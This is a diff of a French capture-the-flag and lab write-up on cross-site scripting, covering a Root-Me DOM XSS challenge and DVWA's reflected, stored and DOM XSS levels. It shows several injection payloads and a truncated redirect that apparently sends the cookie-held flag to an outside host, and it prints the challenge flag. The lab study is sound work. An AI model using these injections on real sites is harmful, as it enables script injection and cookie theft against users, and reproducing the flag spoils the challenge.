@@ -246,7 +246,11 @@ La valeur de l'URL est directement injectée entre des guillemets simples, sans 
 ![script](/images/2026-03-16-18-40-09.png)
 
 - **Forger l'évasion (PoC) :** Pour prouver que l'on peut exécuter du code, il faut "casser" cette ligne de code en injectant la payload suivante à la place du chiffre `42` dans l'URL :
-`42'; alert(1); //`
+
+```sh
+42'; alert(1); //
+```
+
 - `'` permet de fermer prématurément la variable du développeur.
 - `;` termine l'instruction JavaScript.
 - `alert(1)` est le code injecté pour tester l'exécution.
@@ -278,3 +282,57 @@ http://challenge01.root-me.org/web-client/ch32/?number=42';document.location='ht
 ![flag](/images/2026-03-16-19-03-52.png)
 
 🏁 `c=flag=rootme{XSS_D0M_BaSed_InTr0}`
+
+![Validation](/images/2026-03-16-19-11-13.png)
+
+---
+
+## Damn Vulnerable Web Application : XSS
+
+### L'attaque Reflected XSS (Le miroir)
+
+<http://10.0.0.20:4280/vulnerabilities/xss_r/>
+
+Payload :
+
+```sh
+<script>alert("Coucou Reflected !");</script>
+```
+
+![reflected](/images/2026-03-16-19-27-00.png)
+
+![alert](/images/2026-03-16-19-27-10.png)
+
+### L'attaque Stored XSS (Le script persistant)
+
+<http://10.0.0.20:4280/vulnerabilities/xss_s/>
+
+Payload :
+
+```sh
+<script>alert("Coucou Stored !");</script>
+```
+
+![stored](/images/2026-03-16-19-30-58.png)
+
+![alert](/images/2026-03-16-19-31-12.png)
+
+L'alert pop bien, et quand on sort puis reviens sur la page XXS (Stored), l'erreur est persistante !
+
+### L'attaque DOM-based XSS (Le ninja local)
+
+<http://10.0.0.20:4280/vulnerabilities/xss_d>
+
+En choisissant une langue elle apparaît dans l'URL :
+
+<http://10.0.0.20:4280/vulnerabilities/xss_d/?default=German>
+
+Payload :
+
+```sh
+?default=<script>alert("Coucou DOM !");</script>
+```
+
+URL : <http://10.0.0.20:4280/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%22Coucou%20DOM%20!%22);%3C/script%3E>
+
+![alert](/images/2026-03-16-19-36-18.png)
